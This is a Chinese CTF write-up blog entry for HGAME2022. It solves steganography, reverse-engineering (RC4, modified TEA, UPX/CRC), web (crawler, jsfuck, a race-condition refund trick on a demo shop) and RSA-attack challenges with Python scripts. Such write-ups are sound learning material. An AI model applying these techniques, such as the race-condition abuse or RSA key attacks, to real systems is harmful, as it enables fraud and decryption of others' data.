[{"title":"HGAME2022","url":"/2022/02/20/HGAME2022/","content":"<p>学到了很多。</p>\n<span id=\"more\"></span>\n\n<h4 id=\"Level-Week1\"><a href=\"#Level-Week1\" class=\"headerlink\" title=\"Level - Week1\"></a>Level - Week1</h4><h5 id=\"misc\"><a href=\"#misc\" class=\"headerlink\" title=\"misc\"></a>misc</h5><h6 id=\"群青-其实是幽灵东京）\"><a href=\"#群青-其实是幽灵东京）\" class=\"headerlink\" title=\"群青(其实是幽灵东京）\"></a>群青(其实是幽灵东京）</h6><p>1.用Audacity打开，查看其元数据和频谱图，可以得到如下信息。</p>\n<p>why not try try SilentEye</p>\n<p><img src=\"/2022/02/20/HGAME2022/image-20220121133717542.png\" alt=\"image-20220121133717542\"></p>\n<p>2.下载SilentEye，用AES256，key是Yoasobi，点Decode,可以得到一个网址<a href=\"https://potat0-1308188104.cos.ap-shanghai.myqcloud.com/Week1/S_S_T_V.wav%EF%BC%8C%E6%89%93%E5%BC%80%E7%BD%91%E5%9D%80%E4%B8%8B%E8%BD%BD%E9%9F%B3%E9%A2%91%E3%80%82\">https://potat0-1308188104.cos.ap-shanghai.myqcloud.com/Week1/S_S_T_V.wav，打开网址下载音频。</a></p>\n<p><img src=\"/2022/02/20/HGAME2022/image-20220121133647134.png\" alt=\"image-20220121133647134\"></p>\n<p>3.可以得到S_S_T_V.wav文件，搜索sstv，可知其是慢扫描电视，手机下载Robot36，录制音频可以得到图片二维码。</p>\n<p>扫描得到hgame{1_c4n_5ee_the_wav}</p>\n<h5 id=\"re\"><a href=\"#re\" class=\"headerlink\" title=\"re\"></a>re</h5><h6 id=\"flagchecker\"><a href=\"#flagchecker\" class=\"headerlink\" title=\"flagchecker\"></a>flagchecker</h6><p>1.发现是一个apk文件，直接扔到gd-gui，查看其mainactivity，找到如下关键代码。</p>\n<p><img src=\"/2022/02/20/HGAME2022/image-20220120222006699.png\" alt=\"image-20220120222006699\"></p>\n<p>2.encrypt函数是rc4加密函数，carol是加解密密钥，所以直接re4解密就行，选择base64存储明文和密文，可以得到flag。</p>\n<p><img src=\"/2022/02/20/HGAME2022/image-20220120221936991.png\" alt=\"image-20220120221936991\"></p>\n<h6 id=\"easyasm\"><a href=\"#easyasm\" class=\"headerlink\" title=\"easyasm\"></a>easyasm</h6><p>1.用ida打开，发现是简单的汇编语言，根据流程写代码。</p>\n<p>2.可以得到</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">key=[<span class=\"number\">0x91</span>,<span class=\"number\">0x61</span>,<span class=\"number\">0x1</span>,<span class=\"number\">0xC1</span>,<span class=\"number\">0x41</span>,<span class=\"number\">0xA0</span>,<span class=\"number\">0x60</span>,<span class=\"number\">0x41</span>,<span class=\"number\">0xD1</span>,<span class=\"number\">0x21</span>,<span class=\"number\">0x14</span>,<span class=\"number\">0xC1</span>,<span class=\"number\">0x41</span>,<span class=\"number\">0xE2</span>,<span class=\"number\">0x50</span>,<span class=\"number\">0xE1</span>,<span class=\"number\">0xE2</span>,<span class=\"number\">0x54</span>,<span class=\"number\">0x20</span>,<span class=\"number\">0xC1</span>,<span class=\"number\">0xE2</span>,<span class=\"number\">0x60</span>,<span class=\"number\">0x14</span>,<span class=\"number\">0x30</span>,<span class=\"number\">0xD1</span>,<span class=\"number\">0x51</span>,<span class=\"number\">0xC0</span>,<span class=\"number\">0x17</span>]</span><br><span class=\"line\">flag=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">flag=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(key)):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">128</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span>((((((i&lt;&lt;<span class=\"number\">4</span>)+(i&gt;&gt;<span class=\"number\">4</span>)))^<span class=\"number\">0x17</span>)&amp;<span class=\"number\">0xff</span>)==key[j]):</span><br><span class=\"line\">            flag+=<span class=\"built_in\">chr</span>(i)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\"><span class=\"comment\">#hgame&#123;welc0me_to_4sm_w0rld&#125; </span></span><br></pre></td></tr></table></figure>\n\n<p>所以是hgame{welc0me_to_4sm_w0rld} </p>\n<p>这道题主要考察看汇编的能力，其中注意的是ax寄存器，说明其最大为0xff，超过就会被舍去，所以应该&amp;0xff。</p>\n<h6 id=\"creakme\"><a href=\"#creakme\" class=\"headerlink\" title=\"creakme\"></a>creakme</h6><p>这是一道典型的魔改tea，他将经典tea加密修改了delta以及修改了算法（多异或了delta），这样就导致这道题非常多的坑（对于我来说），根据魔改的tea算法得出解题代码。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> ctypes <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decrypt</span>(<span class=\"params\">v, k</span>):</span></span><br><span class=\"line\">    v0, v1 = c_uint32(v[<span class=\"number\">0</span>]), c_uint32(v[<span class=\"number\">1</span>])</span><br><span class=\"line\">    delta = <span class=\"number\">0x12345678</span> </span><br><span class=\"line\">    k0, k1, k2, k3 = k[<span class=\"number\">0</span>], k[<span class=\"number\">1</span>], k[<span class=\"number\">2</span>], k[<span class=\"number\">3</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">    total = c_uint32(delta * <span class=\"number\">32</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">32</span>):                       </span><br><span class=\"line\">        v1.value -= ((v0.value&lt;&lt;<span class=\"number\">4</span>) + k2) ^ (v0.value + total.value) ^ ((v0.value&gt;&gt;<span class=\"number\">5</span>) + k3) ^ total.value</span><br><span class=\"line\">        v0.value -= ((v1.value&lt;&lt;<span class=\"number\">4</span>) + k0) ^ (v1.value + total.value) ^ ((v1.value&gt;&gt;<span class=\"number\">5</span>) + k1) ^ total.value</span><br><span class=\"line\">        total.value -= delta</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> v0.value, v1.value</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># test</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    <span class=\"comment\"># 待加密的明文，两个32位整型，即64bit的明文数据</span></span><br><span class=\"line\">    res = [<span class=\"number\">0x48D93488</span>, <span class=\"number\">0x30C144C</span>]</span><br><span class=\"line\">    res1=[<span class=\"number\">0x52EB78C2</span>,<span class=\"number\">0xED9CE5ED</span>]</span><br><span class=\"line\">    res2=[<span class=\"number\">0xAE1FEDE6</span>,<span class=\"number\">0xBA5A126D</span>]</span><br><span class=\"line\">    res3=[<span class=\"number\">0xCF9284AA</span>,<span class=\"number\">0x65E0F2E3</span>]</span><br><span class=\"line\">    <span class=\"comment\"># 四个key，每个是32bit，即密钥长度为128bit</span></span><br><span class=\"line\">    key = [<span class=\"number\">0x4C4B4A49</span>, <span class=\"number\">0x504F4E4D</span>,<span class=\"number\">0x44434241</span>, <span class=\"number\">0x48474645</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#print(&quot;Data is : &quot;, hex(value[0]), hex(value[1]))</span></span><br><span class=\"line\">    <span class=\"comment\">#res = encrypt(value, key)</span></span><br><span class=\"line\">    <span class=\"comment\">#print(&quot;Encrypted data is : &quot;, hex(res[0]), hex(res[1]))</span></span><br><span class=\"line\">    res = decrypt(res,key)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>( <span class=\"built_in\">hex</span>(res[<span class=\"number\">0</span>]), <span class=\"built_in\">hex</span>(res[<span class=\"number\">1</span>]))</span><br><span class=\"line\">    res = decrypt(res1, key)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>( <span class=\"built_in\">hex</span>(res[<span class=\"number\">0</span>]), <span class=\"built_in\">hex</span>(res[<span class=\"number\">1</span>]))</span><br><span class=\"line\">    res = decrypt(res2, key)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>( <span class=\"built_in\">hex</span>(res[<span class=\"number\">0</span>]), <span class=\"built_in\">hex</span>(res[<span class=\"number\">1</span>]))</span><br><span class=\"line\">    res = decrypt(res3, key)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>( <span class=\"built_in\">hex</span>(res[<span class=\"number\">0</span>]), <span class=\"built_in\">hex</span>(res[<span class=\"number\">1</span>]))</span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"string\">0x6d616768 0x34487b65</span></span><br><span class=\"line\"><span class=\"string\">0x5f797070 0x34633476</span></span><br><span class=\"line\"><span class=\"string\">0x6e306974 0x7d21</span></span><br><span class=\"line\"><span class=\"string\">0x0 0x0&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>将16进制转为字符串，可得magh4H{e_ypp4c4vn0it}! 很明显需要4位一组将字符串倒序，最终得到最后的hgame{H4ppy_v4c4ti0n!}</p>\n<p>需要注意的是，这道题需要修改delta为0x12345678，解密代码增加^ total.value，key的值刚开始我是不知道具体的是什么，动调之后才知道，静态分析是需要注意它是4字节，以及它是小端存储，所以key是key = [0x4C4B4A49, 0x504F4E4D,0x44434241, 0x48474645]，还有它的base64字符串，其实只用到了前半部分，后半部分没用，不要被出题人迷惑，还有delta的类型uint32和int32都可以，一定要主义ida显示的变量类型，其对做题非常有用。</p>\n<p>总的来说，这道题出题人出的很好，牛的。</p>\n<h5 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h5><h6 id=\"蛛蛛…嘿嘿♥我的蛛蛛\"><a href=\"#蛛蛛…嘿嘿♥我的蛛蛛\" class=\"headerlink\" title=\"蛛蛛…嘿嘿♥我的蛛蛛\"></a>蛛蛛…嘿嘿♥我的蛛蛛</h6><p>1.打开网址让点击下一关，F12查看源代码，发现只有一个点我试试有网址，能进入下一个关。写代码自动获取下一关。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium <span class=\"keyword\">import</span> webdriver  <span class=\"comment\">#引入selenium库中的 webdriver 模块</span></span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium.webdriver.chrome.service <span class=\"keyword\">import</span> Service</span><br><span class=\"line\"><span class=\"keyword\">from</span> selenium.webdriver.common.by <span class=\"keyword\">import</span> By</span><br><span class=\"line\"><span class=\"keyword\">from</span> lxml <span class=\"keyword\">import</span> etree</span><br><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\">driver = webdriver.Edge()</span><br><span class=\"line\">driver.maximize_window()</span><br><span class=\"line\">driver.get(<span class=\"string\">&quot;https://hgame-spider.vidar.club/45f0cb5b49?key=ZkaJzLJckhEZGrpYYdtnssnjxprRsnao91yKH4Uw0ibKcs2PXZhMOo7gEsFh%2BSKGJIxKAgtr5gU1JoiiUVA8TQ%3D%3D&quot;</span>) <span class=\"comment\">#打开搜索主页</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1000</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> link <span class=\"keyword\">in</span> driver.find_elements(By.XPATH,<span class=\"string\">&quot;//*[@href]&quot;</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(link.get_attribute(<span class=\"string\">&#x27;href&#x27;</span>)):</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(link.get_attribute(<span class=\"string\">&#x27;href&#x27;</span>))</span><br><span class=\"line\">            driver = webdriver.Edge()</span><br><span class=\"line\">            driver.maximize_window()</span><br><span class=\"line\">            driver.get(link.get_attribute(<span class=\"string\">&#x27;href&#x27;</span>))  <span class=\"comment\"># 打开搜索主页</span></span><br></pre></td></tr></table></figure>\n\n<p>2.到100关之后停下来，F12查看网络，在标头发现flag</p>\n<p>fi4g: hgame{22469f77eb05c194739303890a06c5d6778bde328154be323e9f2cf35a83e4c1}</p>\n<h6 id=\"Tetris-plus\"><a href=\"#Tetris-plus\" class=\"headerlink\" title=\"Tetris plus\"></a>Tetris plus</h6><p>1.说玩到3000分，就给flag，玩到3000分后说flag隐藏了，通过测试发现游戏的运行、计分都是由js脚本来支持的，所以我们找到了请求中的js页面代码，找到.js源代码，发现了checking.js，发现下面注释了一段文字，即jsfuck编码，将其复制到控制台，可得flag。</p>\n<p><img src=\"/2022/02/20/HGAME2022/image-20220121211207328.png\" alt=\"image-20220121211207328\"></p>\n<p>2.这道题主要考察查看.js代码，学会从众多.js文件中找到真的带有flag的文件，也要学会jsfuck的解码。</p>\n<h5 id=\"crypto\"><a href=\"#crypto\" class=\"headerlink\" title=\"crypto\"></a>crypto</h5><h6 id=\"Easy-RSA\"><a href=\"#Easy-RSA\" class=\"headerlink\" title=\"Easy RSA\"></a>Easy RSA</h6><p>根据py代码，可知每个括号的四个数字分别代表e，p，q，密文，根据前三者可将密文转为明文，就这样一个一个字符的转换，可得完整flag。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">hgame&#123;L00ks_l1ke_y0<span class=\"string\">u&#x27;ve_mastered_RS4!&#125;</span></span><br></pre></td></tr></table></figure>\n\n<h6 id=\"English-Novel\"><a href=\"#English-Novel\" class=\"headerlink\" title=\"English Novel\"></a>English Novel</h6><p>1.查看python代码，发现是移位密码，但是每位符号位移位大小不同，其大小由key决定，所以要求key的值。</p>\n<p>2.要注意encrypt和original中part数字相同所对应的加密解密是不同的，所以要找属于一个加解密的两个part，通过写py代码，可知encrypt中的part0和original中的part194对应，encrypt中的part2和original中的part276对应，通过这两个对应可以完整知道前44个key的值。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">part194=<span class=\"string\">&quot;e gnawed the bark off the fruit trees. Whene&quot;</span></span><br><span class=\"line\">part000=<span class=\"string\">&quot;h yzbuxn eif tnkn ifk xin feqls tndnt. Kvhqx&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">part002=<span class=\"string\">&quot;q xmdr gncf xmgmlza tx xnugup hu wmhuenbu. H&quot;</span></span><br><span class=\"line\">part276=<span class=\"string\">&quot;n fact were putting on weight if anything. O&quot;</span></span><br><span class=\"line\">keyv=[]</span><br><span class=\"line\">keyv1=[]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(part276)):</span><br><span class=\"line\">    keyv.append(<span class=\"built_in\">ord</span>(part000[i])-<span class=\"built_in\">ord</span>(part194[i]))  <span class=\"comment\">#密文-明文</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(part276)):</span><br><span class=\"line\">    keyv1.append(<span class=\"built_in\">ord</span>(part002[i])-<span class=\"built_in\">ord</span>(part276[i]))  <span class=\"comment\">#密文-明文</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(keyv))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(keyv1))</span><br><span class=\"line\"></span><br><span class=\"line\">kevr=[]</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">44</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(keyv[i]!=<span class=\"number\">0</span>):</span><br><span class=\"line\">        kevr.append(keyv[i])</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(keyv1[i]!=<span class=\"number\">0</span>):</span><br><span class=\"line\">        kevr.append(keyv1[i])</span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(keyv[i]==<span class=\"number\">0</span> <span class=\"keyword\">and</span> keyv1[i]==<span class=\"number\">0</span>):</span><br><span class=\"line\">        kevr.append(<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(kevr))</span><br><span class=\"line\"><span class=\"comment\">#[3, 0, 18, 12, 1, -2, 19, 10, 0, -15, 1, 1, 0, 18, 13, -7, 3, 0, -6, 0, 5, 0, 4, 1, 9, 0, 0, -13, -4, 3, -1, 0, 0, -4, -1, 9, 1, 0, 0, -12, 14, 3, 3, 19]</span></span><br><span class=\"line\"><span class=\"comment\">#[3, 0, 18, 12, 1, -2, 0, -16, 9, -15, 1, 0, 8, -8, -13, -7, 3, 12, -6, 0, 5, 10, 0, 1, 9, 12, 0, 13, -4, 0, -1, 15, 0, 22, -1, -17, 1, -3, 5, -12, 14, 0, 0, -7]</span></span><br><span class=\"line\"><span class=\"comment\">#[3, 0, 18, 12, 1, -2, 19, 10, 9, -15, 1, 1, 8, 18, 13, -7, 3, 12, -6, 0, 5, 10, 4, 1, 9, 12, 0, -13, -4, 3, -1, 15, 0, -4, -1, 9, 1, -3, 5, -12, 14, 3, 3, 19]</span></span><br></pre></td></tr></table></figure>\n\n<p>3.通过前44个key的值可以将密文转为明文，其中解密代码和加密代码一样。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">enc=<span class=\"string\">&#x27;klsyf&#123;W0_j0v_ca0z_\\&#x27;Ks0ao-bln1qstxp_juqfqy\\&#x27;?&#125;&#x27;</span></span><br><span class=\"line\">realkey=[<span class=\"number\">3</span>, <span class=\"number\">0</span>, <span class=\"number\">18</span>, <span class=\"number\">12</span>, <span class=\"number\">1</span>, -<span class=\"number\">2</span>, <span class=\"number\">19</span>, <span class=\"number\">10</span>, <span class=\"number\">9</span>, -<span class=\"number\">15</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">8</span>, <span class=\"number\">18</span>, <span class=\"number\">13</span>, -<span class=\"number\">7</span>, <span class=\"number\">3</span>, <span class=\"number\">12</span>, -<span class=\"number\">6</span>, <span class=\"number\">0</span>, <span class=\"number\">5</span>, <span class=\"number\">10</span>, <span class=\"number\">4</span>, <span class=\"number\">1</span>, <span class=\"number\">9</span>, <span class=\"number\">12</span>, <span class=\"number\">0</span>, -<span class=\"number\">13</span>, -<span class=\"number\">4</span>, <span class=\"number\">3</span>, -<span class=\"number\">1</span>, <span class=\"number\">15</span>, <span class=\"number\">0</span>, -<span class=\"number\">4</span>, -<span class=\"number\">1</span>, <span class=\"number\">9</span>, <span class=\"number\">1</span>, -<span class=\"number\">3</span>, <span class=\"number\">5</span>, -<span class=\"number\">12</span>, <span class=\"number\">14</span>, <span class=\"number\">3</span>, <span class=\"number\">3</span>, <span class=\"number\">19</span>]</span><br><span class=\"line\">flag=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">44</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span> enc[i].isupper():</span><br><span class=\"line\">        flag+=<span class=\"built_in\">chr</span>((<span class=\"built_in\">ord</span>(enc[i])-realkey[i]-<span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;A&#x27;</span>))%<span class=\"number\">26</span>+<span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;A&#x27;</span>))</span><br><span class=\"line\">    <span class=\"keyword\">elif</span> enc[i].islower():</span><br><span class=\"line\">        flag += <span class=\"built_in\">chr</span>((<span class=\"built_in\">ord</span>(enc[i]) - realkey[i]-<span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>))%<span class=\"number\">26</span>+<span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>))</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        flag+= enc[i]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">len</span>(flag))</span><br><span class=\"line\"><span class=\"comment\">#hlame&#123;D0_y0u_kn0w_&#x27;Kn0wn-pla1ntext_attack&#x27;?&#125;</span></span><br></pre></td></tr></table></figure>\n\n<p>将第二个字符换成g可以得到完整的flag，hgame{D0_y0u_kn0w_’Kn0wn-pla1ntext_attack’?}</p>\n<p>总体来说，这道题的思维不难，但是比较麻烦，尤其是找对应的part内容，找的过程中最好使用python文件读取代码，可以快速找到对应。</p>\n<h5 id=\"IoT\"><a href=\"#IoT\" class=\"headerlink\" title=\"IoT\"></a>IoT</h5><h6 id=\"饭卡的uno\"><a href=\"#饭卡的uno\" class=\"headerlink\" title=\"饭卡的uno\"></a>饭卡的uno</h6><p>1.了解到iot所提供的hex文件需要用ida打开，在开始界面，要选择arm类型进行分析。</p>\n<p>2.ida打开后，shift+F12查看字符串，可以发现flag</p>\n<p>即hgame{F1rst_5tep_0F_IOT}</p>\n<p>这种应该是Iot类型最简单的题了。</p>\n<h4 id=\"Level-Week2\"><a href=\"#Level-Week2\" class=\"headerlink\" title=\"Level - Week2\"></a>Level - Week2</h4><h5 id=\"re-1\"><a href=\"#re-1\" class=\"headerlink\" title=\"re\"></a>re</h5><h6 id=\"xD-MAZE\"><a href=\"#xD-MAZE\" class=\"headerlink\" title=\"xD MAZE\"></a>xD MAZE</h6><p>1.题目说是迷宫题，查看字符串发现没有迷宫，找到关键函数，发现switch函数，让我们比较0 1 2 3，v对应加不同的值。</p>\n<p>2.找到比较函数，发现其需要数组下标对应的数等于32并且v&lt;4095,查看数组内容，发现有顺序分布不同的32，所以通过switch选择不同的位移使它始终指向32。最终得出3120113031203203222231003011。</p>\n<p>所以是hgame{3120113031203203222231003011}</p>\n<p>这类迷宫题较简单，懂得比较函数就可以得到flag。</p>\n<h6 id=\"upx-magic\"><a href=\"#upx-magic\" class=\"headerlink\" title=\"upx magic\"></a>upx magic</h6><p>1.看题目知道是upx加壳，直接命令行upx脱壳，ida64打开。</p>\n<p>2.找到关键函数，发现是对比长度是32，以及单字符处理，32个字符全部加密完后，在进行比较。</p>\n<p>3.暴力破解代码：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">key=[<span class=\"number\">3620040265</span>,<span class=\"number\">10770</span>,<span class=\"number\">43802</span>,<span class=\"number\">52188</span>,<span class=\"number\">47403</span>,<span class=\"number\">11826</span>,<span class=\"number\">40793</span>,<span class=\"number\">56781</span>,<span class=\"number\">40265</span>,<span class=\"number\">43274</span>,<span class=\"number\">3696</span>,<span class=\"number\">62927</span>,<span class=\"number\">2640</span>,<span class=\"number\">23285</span>,<span class=\"number\">65439</span>,<span class=\"number\">40793</span>,</span><br><span class=\"line\"><span class=\"number\">48395</span>,<span class=\"number\">22757</span>,<span class=\"number\">14371</span>,<span class=\"number\">48923</span>,<span class=\"number\">30887</span>,<span class=\"number\">43802</span>,<span class=\"number\">18628</span>,<span class=\"number\">43274</span>,<span class=\"number\">11298</span>,<span class=\"number\">40793</span>,<span class=\"number\">23749</span>,<span class=\"number\">24277</span>,<span class=\"number\">30887</span>,<span class=\"number\">9842</span>,<span class=\"number\">22165</span>]</span><br><span class=\"line\">flag=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">32</span>,<span class=\"number\">128</span>):</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">32</span>):</span><br><span class=\"line\">        mm=i</span><br><span class=\"line\">        mm=mm&lt;&lt;<span class=\"number\">8</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> m <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">8</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(mm&amp;<span class=\"number\">0x8000</span>!=<span class=\"number\">0</span>):</span><br><span class=\"line\">                mm=(<span class=\"number\">2</span>*mm)^<span class=\"number\">0x1021</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                mm=mm*<span class=\"number\">2</span></span><br><span class=\"line\">        mm=mm&amp;<span class=\"number\">0xffff</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span>(mm,i)</span><br><span class=\"line\">key1=[<span class=\"number\">45</span>,<span class=\"number\">85</span>,<span class=\"number\">80</span>,<span class=\"number\">120</span>,<span class=\"number\">126</span>,<span class=\"number\">109</span>,<span class=\"number\">65</span>,<span class=\"number\">71</span>,<span class=\"number\">124</span>,<span class=\"number\">67</span>,<span class=\"number\">95</span>,<span class=\"number\">64</span>,<span class=\"number\">78</span>,<span class=\"number\">100</span>,<span class=\"number\">126</span>,<span class=\"number\">99</span>,<span class=\"number\">114</span>,<span class=\"number\">67</span>,<span class=\"number\">49</span>,<span class=\"number\">54</span>]</span><br><span class=\"line\">flagy=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(key1)):</span><br><span class=\"line\">    flagy+=<span class=\"built_in\">chr</span>(key1[i])</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flagy)</span><br><span class=\"line\"></span><br><span class=\"line\">flag2=<span class=\"string\">&quot;noW_YOu~koNw-UPx~mAG|C_@Nd~crC16&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>print(mm,i) 运算完后，再用key一个一个的比较。最终得到flag。</p>\n<p>hgame{noW_YOu<del>koNw-UPx</del>mAG|C_@Nd~crC16}</p>\n<h5 id=\"Web-1\"><a href=\"#Web-1\" class=\"headerlink\" title=\"Web\"></a>Web</h5><h6 id=\"webpack-engine\"><a href=\"#webpack-engine\" class=\"headerlink\" title=\"webpack-engine\"></a>webpack-engine</h6><p>1.查看源代码，找&lt;head&gt;标签中第三个&lt;style&gt;,找到注释，将其base64解码，得到YUdkaGJXVjdSREJ1ZEY5bU1ISTVaWFJmTWw5RGJFOXpNMTlUTUhWeVkyVmZiVUJ3ZlE9PQo=，将其base64解码2次，可以得到最终的hgame{D0nt_f0r9et_2_ClOs3_S0urce_m@p}。</p>\n<p>2.感觉这种题只能硬找，找到了运气好，找不到也只能自认倒霉。</p>\n<h5 id=\"Crypto\"><a href=\"#Crypto\" class=\"headerlink\" title=\"Crypto\"></a>Crypto</h5><h6 id=\"RSA-Attack\"><a href=\"#RSA-Attack\" class=\"headerlink\" title=\"RSA Attack\"></a>RSA Attack</h6><p>1.查看代码，发现是rsa加密，e=65537,n=700612512827159827368074182577656505408114629807,密文=122622425510870177715177368049049966519567512708</p>\n<p>2.将n分解出p，q</p>\n<p>p=715800347513314032483037<br>q=978782023871716954857211</p>\n<p>3.输入p，q密文，解密可得flag</p>\n<p>hgame{SHorTesT!fLAg}</p>\n<h6 id=\"RSA-Attack-2\"><a href=\"#RSA-Attack-2\" class=\"headerlink\" title=\"RSA Attack 2\"></a>RSA Attack 2</h6><p>1.打开py文件，发现是rsa解密，打开out.txt</p>\n<p>2.其分为三部分，分别用分解模数，小e攻击，共模攻击可以分别得到3部分flag。</p>\n<p>hgame{RsA@hAS!a&amp;VArIETY?of.</p>\n<p>AttacK^mEThodS^whAT:other!A</p>\n<p>ttACK|METHOdS~do@you_KNOW}</p>\n<p>将其拼接，可得：</p>\n<p>hgame{RsA@hAS!a&amp;VArIETY?of.AttacK^mEThodS^whAT:other!AttACK|METHOdS~do@you_KNOW}</p>\n<h4 id=\"Level-Week3\"><a href=\"#Level-Week3\" class=\"headerlink\" title=\"Level - Week3\"></a>Level - Week3</h4><h6 id=\"RSA-Attack-3\"><a href=\"#RSA-Attack-3\" class=\"headerlink\" title=\"RSA Attack 3\"></a>RSA Attack 3</h6><p>使用维纳攻击可以得到flag</p>\n<p>hgame{dO|YOU:kNOw!tHE<em>PRINcIplE</em>bEhInd%WInNEr#aTTacK}</p>\n<h6 id=\"Multi-Prime-RSA\"><a href=\"#Multi-Prime-RSA\" class=\"headerlink\" title=\"Multi Prime RSA\"></a>Multi Prime RSA</h6><p>多素数攻击，输入多个素数，计算n与私钥，在计算明文，可以得到flag，文本文档给的n好像没用。</p>\n<p>hgame{EulEr:fUNcTIon;iS.So<em>IMpORTaNt</em>In&amp;RsA}</p>\n<h5 id=\"Web-2\"><a href=\"#Web-2\" class=\"headerlink\" title=\"Web\"></a>Web</h5><h6 id=\"Vidar-shop-demo\"><a href=\"#Vidar-shop-demo\" class=\"headerlink\" title=\"Vidar shop demo\"></a>Vidar shop demo</h6><p>条件竞争漏洞</p>\n<p>注册一个账号，买flag发现少一个币，且支付后删除发现币又退回，考虑条件竞争漏洞，即买了之后用两个浏览器同时删除。</p>\n<p>刚开始是用一个电脑一个手机同时删除，发现怎么弄都不行，之后用两个手机，并且买多个一样的且都支付，两个手机同时狂点多个删除，能提高很大的成功率。试了两次就成功了，钱大于10000后，买flag就行。</p>\n<p>hgame{64b3c7b5f3e14b7373d47c8fefae64a712c9b101af6d7676902a606f7cde37f8}</p>\n","categories":["ctf比赛"],"tags":["杭电 